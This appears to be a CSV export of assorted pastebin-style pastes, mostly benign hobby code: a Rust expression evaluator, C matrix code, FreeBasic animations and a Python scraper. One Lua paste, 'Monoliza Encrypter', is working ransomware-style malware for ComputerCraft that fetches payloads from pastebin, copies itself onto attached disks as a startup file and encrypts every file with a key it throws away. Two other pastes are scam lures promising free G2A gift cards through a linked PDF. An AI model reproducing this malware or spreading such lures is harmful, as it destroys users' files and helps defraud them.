id,title,username,language,date,content
hfaZYFqg,expr eval,mdgaziur001,Rust,Thursday 4th of April 2024 12:53:01 PM CDT,"use std::f64::consts::PI;
use std::io;
use std::io::Write;
use std::str::Chars;

#[derive(Debug)]
struct Tokenizer<'t> {
    iterator: Chars<'t>,
}

impl<'t> Tokenizer<'t> {
    pub fn new(source: &'t str) -> Self {
        Self {
            iterator: source.chars(),
        }
    }

    pub fn next_token(&mut self) -> Result<Option<Token>, String> {
        let Some(next) = self.iterator.next() else {
            return Ok(None);
        };

        match next {
            '(' => Ok(Some(Token::BrOpen)),
            ')' => Ok(Some(Token::BrClose)),
            '^' => Ok(Some(Token::Op(MathOp::Pow))),
            '+' => Ok(Some(Token::Op(MathOp::Add))),
            '-' => Ok(Some(Token::Op(MathOp::Sub))),
            '*' => Ok(Some(Token::Op(MathOp::Mul))),
            '/' => Ok(Some(Token::Op(MathOp::Div))),
            'π' => Ok(Some(Token::Num(PI))),
            ch if ch.is_ascii_digit() || ch == '.' => {
                let mut num = String::from(ch);
                let mut it2 = self.iterator.clone();

                while let Some(next_ch) = it2.next() {
                    if !next_ch.is_ascii_digit() && next_ch != '.' {
                        break;
                    }

                    num.push(next_ch);
                    self.iterator.next();
                }

                Ok(Some(Token::Num(num.parse().map_err(|e| {
                    format!(""Encountered error while parsing number: {e}"")
                })?)))
            }
            ' ' => self.next_token(),
            _ => Err(""Encountered unexpected character"".to_string()),
        }
    }
}

/// Parser grammar:
///
/// ```
/// expr = term;
/// term = factor ((""+"" | ""-"") factor)*;
/// factor = power ((""*"" | ""/"") power)*;
/// power = unary (""^"" unary)*;
/// unary = ""-""? (unary | primary);
/// primary = Num | ""("" expr "")"";
/// ```
#[derive(Debug)]
struct Parser<'ecx> {
    tokenizer: Tokenizer<'ecx>,
    current: Option<Token>,
}

impl<'ecx> Parser<'ecx> {
    pub fn new(mut tokenizer: Tokenizer<'ecx>) -> Result<Option<Self>, String> {
        let current = tokenizer.next_token()?;

        Ok(Some(Self {
            tokenizer,
            current,
        }))
    }

    pub fn parse(&mut self) -> Result<AST, String> {
        self.term()
    }

    fn term(&mut self) -> Result<AST, String> {
        let mut expr = self.factor()?;

        while self.current == Some(Token::Op(MathOp::Add)) || self.current == Some(Token::Op(MathOp::Sub)) {
            let Token::Op(op) = self.current.unwrap() else {
                unreachable!()
            };

            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.factor()?),
                op,
            })
        }

        Ok(expr)
    }

    fn factor(&mut self) -> Result<AST, String> {
        let mut expr = self.power()?;

        while self.current == Some(Token::Op(MathOp::Mul)) || self.current == Some(Token::Op(MathOp::Div)) {
            let Token::Op(op) = self.current.unwrap() else {
                unreachable!()
            };

            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.power()?),
                op,
            })
        }

        Ok(expr)
    }

    fn power(&mut self) -> Result<AST, String> {
        let mut expr = self.unary()?;

        while self.current == Some(Token::Op(MathOp::Pow)) {
            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.unary()?),
                op: MathOp::Pow,
            })
        }

        Ok(expr)
    }

    fn unary(&mut self) -> Result<AST, String> {
        if matches!(self.current, Some(Token::Op(MathOp::Sub))) {
            let _ = self.next()?;

            let operand = self.unary()?;
            Ok(AST::Neg(Box::new(operand)))
        } else {
            self.primary()
        }
    }

    fn primary(&mut self) -> Result<AST, String> {
        match self.current {
            Some(Token::Num(num)) => {
                self.next()?;
                Ok(AST::Num(num))
            },
            Some(Token::BrOpen) => {
                // Consume ""(""
                let _ = self.next()?;

                // Parse inner expression
                let parsed = self.parse();

                // Consume "")""
                let _ = self.expect(Token::BrClose)?;

                parsed
            }
            Some(_) => Err(""Unexpected token"".to_string()),
            None => Err(""Unexpected EOF"".to_string())
        }
    }

    fn expect(&mut self, expected: Token) -> Result<Token, String> {
        if !matches!(self.current, Some(_expected)) {
            Err(format!(""Expected {expected:?}, found {:?}"", self.current))
        } else {
            Ok(self.current.unwrap())
        }
    }

    fn next(&mut self) -> Result<Option<Token>, String> {
        self.current = self.tokenizer.next_token()?;
        Ok(self.current)
    }
}

#[derive(Debug)]
enum AST {
    Num(f64),
    Op(Operation),
    Neg(Box<AST>),
}

#[derive(Debug)]
struct Operation {
    lhs: Box<AST>,
    rhs: Box<AST>,
    op: MathOp,
}

#[derive(Debug, Copy, Clone, PartialEq)]
enum Token {
    Num(f64),
    BrOpen,
    BrClose,
    Op(MathOp),
}

#[derive(Debug, Copy, Clone, PartialEq)]
enum MathOp {
    Add,
    Sub,
    Mul,
    Div,
    Pow,
}

fn eval_ast(ast: &AST) -> Result<f64, String> {
    match ast {
        AST::Num(num) => Ok(*num),
        AST::Op(operation) => {
            let lhs = eval_ast(&operation.lhs)?;
            let rhs = eval_ast(&operation.rhs)?;

            Ok(match operation.op {
                MathOp::Add => lhs + rhs,
                MathOp::Sub => lhs - rhs,
                MathOp::Mul => lhs * rhs,
                MathOp::Div => lhs / rhs,
                MathOp::Pow => lhs.powf(rhs)
            })
        }
        AST::Neg(expr) => Ok(-eval_ast(expr)?)
    }
}

fn process_expr(expr: &str) {
    let tokenizer = Tokenizer::new(&expr);
    let mut parser = match Parser::new(tokenizer) {
        Ok(Some(parser)) => parser,
        Ok(None) => return,
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    };

    let ast = match parser.parse() {
        Ok(ast) => ast,
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    };

    match eval_ast(&ast) {
        Ok(res) => println!(""{res}""),
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    }
}

fn take_input() -> String {
    print!(""> "");
    io::stdout().flush().unwrap();
    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();

    buf.trim().to_string()
}

fn main() {
    loop {
        let input = take_input();
        if input == ""q"" {
            break;
        }

        process_expr(&input);
    }
}
"
C2Nfsmzh,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 4th of April 2024 12:36:38 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_812090.pdf

Working as of:
04 April 2024"
aRvjUkMC,Monoliza Encrypter,matveymayner,Lua,Thursday 4th of April 2024 12:31:28 PM CDT,"local function getSubPaths(path)
    local list = fs.list(path)
    local paths = {}
 
    for _, name in pairs(list) do
        local newPath = fs.combine(path, name)
        if (fs.isDir(newPath)) then
            local subPaths = getSubPaths(newPath)
            for i = 1, #subPaths do
                paths[#paths+1] = subPaths[i]
            end
        else
            paths[#paths+1] = newPath
        end
    end
 
    return paths
end
 
local function getPaths(path, readROM)
    if (path == """" or path == ""/"") then
        if (readROM) then
            return getSubPaths(path)
        else
            local list = fs.list(""/"")
            local paths = {}
            for _, path in pairs(list) do
                if (path ~= ""rom"") then
                    if (fs.isDir(path)) then
                        local subPaths = getSubPaths(path)
                        for i = 1, #subPaths do
                            paths[#paths+1] = subPaths[i]
                        end
                    else
                        paths[#paths+1] = path
                    end
                end
            end
            return paths
        end
    else
        return getSubPaths(path)
    end
end
 
 
local files = getPaths(""/"", false)
os.setComputerLabel(""Crypt0 PC"")
fs.delete(""virus"")
fs.makeDir(""virus"")
shell.run(""pastebin get EuUDCuRZ virus/vir"")
shell.run(""pastebin get 9YW1XWXN virus/logsalt"")
shell.run(""pastebin get DMx8M0LP virus/aeslua"")
os.loadAPI(""virus/aeslua"")
os.loadAPI(""virus/logsalt"")
 
if fs.exists(""disk"") and fs.isDir(""disk"") then
if fs.exists(""disk/startup"") then
fs.delete(""disk/startup"")
end
fs.copy(""virus/vir"", ""disk/startup"") -- i am evil
end
 
if fs.exists(""disk2"") and fs.isDir(""disk2"") then
if fs.exists(""disk2/startup"") then
fs.delete(""disk2/startup"")
end
fs.copy(""virus/vir"", ""disk2/startup"") -- i am evil v2
end
 
local dec = logsalt.rand(10)
for _,v in pairs(files) do
if string.sub(v, 1,5) == ""virus"" then
    else
print(""Found file "" .. v)
end
end
print(""starting enc"")
local iv = {}
for i = 1,16 do iv[i] = math.random(1,255) end
for _,v in pairs(files) do
    if v == ""virus/aeslua"" or v == ""virus/logsalt"" or v == ""virus/vir"" or v == ""disk/startup"" or v == ""disk2/startup"" then
    else
    local hBf = fs.open(v, ""r"")
    local stuff = hBf.readAll()
    local encrypted = aeslua.encrypt(dec,stuff)
    print(""Encrypted file "" .. v)
    hBf.close()
    hAf = fs.open(v, ""w"")
    hAf.write(encrypted)
    hAf.close()
    end
end
 
term.clear()
term.setBackgroundColor(colors.red)
term.setCursorPos(1,1)
for i=1,16 do
  term.setCursorPos(1,i)
term.write(""-MONOLIZA ENCRYPT-"")
term.write(""Your All Files Has Been Encrypted"")
end
"
aQbdKNRj,Untitled,vuseless,HTML,Thursday 4th of April 2024 12:28:58 PM CDT,"<div id=""div_id_votes"" class=""form-group""> <div class> <div class=""form-check""> <input type=""checkbox"" class=""form-check-input"" name=""votes"" id=""id_votes_1"" value=""me""> <label class=""form-check-label"" for=""id_votes_1"">
me
</label> </div> <div class=""form-check""> <input type=""checkbox"" class=""form-check-input"" name=""votes"" id=""id_votes_2"" value=""stcking (pnty and stcking with grterbelt)""> <label class=""form-check-label"" for=""id_votes_2"">
stcking (pnty and stcking with grterbelt)
</label> </div> </div> </div>
</div>
onlinepoll.me/poll/vote/who-wins-174"
Jw3ve2Ej,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 4th of April 2024 12:28:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
04 April 2024"
B7EcaFtU,finaly_hueta,artmexbet,C,Thursday 4th of April 2024 12:21:48 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <string.h>

#define ROWS 4
#define COLS 5

struct ThreadResult {
    int count;
    int indexes[6];
};

struct ThreadInfo {
    int matrix[ROWS][COLS];
    int deltaX;
    int deltaY;
    int currentIndexI;
    int currentIndexJ;
    struct ThreadResult result;
};

void fill_matrix(int array[ROWS][COLS]) {
    srand(time(NULL));
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            array[i][j] = 1 + rand() % 3;
        }
    }
}

void print_matrix(int array[ROWS][COLS]) {
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            printf(""%d "", array[i][j]);
        }
        printf(""\n"");
    }
}

void *get_values(void *info_) {
    struct ThreadInfo *info = (struct ThreadInfo *) info_;
    struct ThreadResult *result = (struct ThreadResult *) malloc(sizeof(struct ThreadResult));
    result->count = 0;
    // Вот отсюда можно выкинуть вычисление уголочка из этой точки в отдельный поток
    int k = 0;
    int lengthOfHorizontal = 0; // Сюда сохраняем длину повторящихся символов в строке
    int i = info->currentIndexI;
    int j = info->currentIndexJ;
    while (0 < j + k && j + k < COLS && info->matrix[i][j + k] == info->matrix[i][j]) {
        lengthOfHorizontal++;
        // Или вот отсюда можно запускать потоки, проверяющие вертикальные линии на совпадение с элементом matrix[i][j]
        // Нижний цикл выкинуть в отдельный поток
        int l = 0;
        int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
        while (0 < i + l && i + l < ROWS && info->matrix[i + l][j + k] == info->matrix[i][j + k]) {
            lengthOfVertical++;
            l += info->deltaX;
        }
        if (lengthOfHorizontal + lengthOfVertical > result->count) {
            result->indexes[0] = i;
            result->indexes[1] = j;
            result->indexes[2] = i;
            result->indexes[3] = j + k;
            result->indexes[4] = i + l - 1 * info->deltaX;
            result->indexes[5] = j + k;
            result->count = lengthOfHorizontal + lengthOfVertical;
//                    coords = {i, j, i, j + k, i + l - 1, j + k};
        }
        k += info->deltaY;
    }
    return (void *) result;
}

void find_g(int matrix[ROWS][COLS]) {
    int maxCount = 0;
    int coords[] = {0, 0, 0, 0, 0, 0};
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            struct ThreadInfo first, second, third, fourth;
            struct ThreadResult *result1, *result2, *result3, *result4;
            memcpy(first.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(second.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(third.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(fourth.matrix, matrix, ROWS * COLS * sizeof(int));
            first.deltaX = 1;
            first.deltaY = -1;
            first.currentIndexI = i;
            first.currentIndexJ = j;

            second.deltaX = -1;
            second.deltaY = -1;
            second.currentIndexI = i;
            second.currentIndexJ = j;

            third.deltaX = -1;
            third.deltaY = 1;
            third.currentIndexI = i;
            third.currentIndexJ = j;

            fourth.deltaX = 1;
            fourth.deltaY = 1;
            fourth.currentIndexI = i;
            fourth.currentIndexJ = j;

            pthread_t thread1, thread2, thread3, thread4;
            pthread_create(&thread1, NULL, &get_values, &first);
            pthread_create(&thread2, NULL, &get_values, &second);
            pthread_create(&thread3, NULL, &get_values, &third);
            pthread_create(&thread4, NULL, &get_values, &fourth);
            pthread_join(thread1, (void **) &result1);
            pthread_join(thread2, (void **) &result2);
            pthread_join(thread3, (void **) &result3);
            pthread_join(thread4, (void **) &result4);
//            for (int i = 0; i < 6; i++) {
//                printf(""%d "", first.result.indexes[i]);
//            }
//            printf(""\n"");
            if (result1->count > maxCount) {
                maxCount = result1->count;
                memcpy(coords, result1->indexes, sizeof(result1->indexes));
            }
            if (result2->count > maxCount) {
                maxCount = result2->count;
                memcpy(coords, result2->indexes, sizeof(result2->indexes));
            }
            if (result3->count > maxCount) {
                maxCount = result3->count;
                memcpy(coords, result3->indexes, sizeof(result3->indexes));
            }
            if (result4->count > maxCount) {
                maxCount = result4->count;
                memcpy(coords, result4->indexes, sizeof(result4->indexes));
            }
        }
    }
    for (int i = 0; i < 6; i++) {
        printf(""%d "", coords[i]);
    }
}

int main() {
//    printf(""Hello, World!\n"");
    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
                           {0, 1, 1, 1, 0},
                           {2, 0, 2, 1, 1},
                           {0, 2, 0, 1, 1}};
//    fill_matrix(arr);
    print_matrix(arr);
    find_g(arr);
    return 0;
}
"
6n6QvRPT,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 12:16:54 PM CDT,"#include ""fbgfx.bi""

const ScreenWid=640,ScreenHei=480 

screenres ScreenWid,ScreenHei,8  'setup 640x480x8bpp (256 colors)
width ScreenWid\8,ScreenHei\16   'set font size to 8x16

'iDirX is how many pixels it moves per frame (initially 1 (to the right))
'since we're going from -10 to 10... that number must be a divisor of 10
'so must be one of 1,2,5 or 10 (this simplify the check)
dim as integer iOffsetX,iDirX=1
dim as integer iPosX,iPosY
dim as string sSentence = ""Hello World""

'calculate center position for sentence
iPosX = (ScreenWid-len(sSentence)*8)\2 'horizontal
iPosY = (ScreenHei-16)\2      'vertical

do
  
  screenlock 'block screen from update
    cls 'clears whole screen (could fill just an area)
    'draw centered text over right position (in yellow)
    Draw String ( iPosX+iOffsetX , iPosY ) , sSentence , 14
    
    iOffsetX += iDirX 'change position depending on direction (left/right)
    if iOffsetX = -10 orelse iOffsetX = 10 then 
      iDirX = -iDirX 'if it hit side positions invert direction
    end if
  screenunlock 'allow display of the screen
  sleep 30 'waits 30ms... making roughly 30fps
  
  'draw frames until ESC is pressed
loop until multikey(fb.SC_ESCAPE)"
TmKnPaQS,Untitled,retroman,FreeBasic,Thursday 4th of April 2024 12:11:33 PM CDT,"dim as string strings(1 to 10) = {""hello world"","" hello world"",""  hello world"",""   hello world"",""    hello world"",""     hello world"",""      hello world"",""       hello world"",""        hello world"",""         hello world""}

for h as integer = 1 to 10 step 1
	color 4
	for i as integer = 1 to 10 step 1
		print strings(i)
		sleep 100
		shell(""cls"")
	next
	color 6
	for j as integer = 10 to 1 step -1
		print strings(j)
		sleep 100
		shell(""cls"")
	next
next
sleep
"
BVCYikLA,Untitled,poxipox,Lua,Thursday 4th of April 2024 12:03:51 PM CDT,"glbMissionCfg.setMission(cid, playerMission)

NA:

		if missionTab.talk_start_addNextMission then
			glbMissionCfg.setMission(cid, playerMission+1)
		else
			glbMissionCfg.setMission(cid, playerMission)
		end
"
XhDpAjmZ,Noam Oved | HW Networks,XNoAmX,Python,Thursday 4th of April 2024 11:47:08 AM CDT,"import requests
from lxml import html

LETTER_OFFSET = 100

def scrape_files():
    """"""
    Scrape files from a specific URL and return a list of file names.
    :return: A list of file names
    :rtype: list
    """"""
    URL = ""http://webisfun.cyber.org.il/nahman/files/""
    response = requests.get(URL)
    tree = html.fromstring(response.content)
    trs = tree.xpath('//a')

    file_list = []

    for tr in trs:
        file_list.append(tr.attrib.get('href'))
    return file_list[5:]

def extract_password_from_site():
    """"""    
    Extract a password from files obtained from a website.
    :return: Extracted password
    :rtype: str
    """"""
    URL = ""http://webisfun.cyber.org.il/nahman/files/{file}""
    password = """"
    for i in scrape_files():
        response = requests.get(URL.format(file = str(i)))
        password += response.content.decode('utf-8')[LETTER_OFFSET - 1]
    return password

def find_most_common_words(URL, words_in_sentence):
    """"""
    Fetches text from the provided URL, counts the frequency of each word, 
    and returns a string containing the most common words up to the specified count.
    :param URL: The URL from which to fetch the text
    :param words_in_sentence: Number of most common words to include in the output sentence
    :type URL: str
    :type words_in_sentence: int
    :return: A string containing the most common words
    :rtype: str
    """"""
    response = requests.get(URL)
    response = response.content.decode('utf-8')
    wordlist = response.split("" "")
    freq_dict = {}

    for element in wordlist:  
        if element in freq_dict:
            freq_dict[element] += 1  
        else:  
            freq_dict[element] = 1
              
    freq_dict = dict(sorted(freq_dict.items(), key=lambda item: item[1], reverse=True))  

    return "" "".join(list(freq_dict.keys())[:words_in_sentence])

def main():
    print(""[!] Welcome to nahman cracker"")
    print(""[1] Get password"")
    print(""[2] Get sentence "")
    option = input(""[+] "")
    
    if option == '1':
        print(extract_password_from_site())
    elif option == '2':
        print(find_most_common_words(""http://webisfun.cyber.org.il/nahman/final_phase/words.txt"", 6))

if __name__ == '__main__':
    main()

"
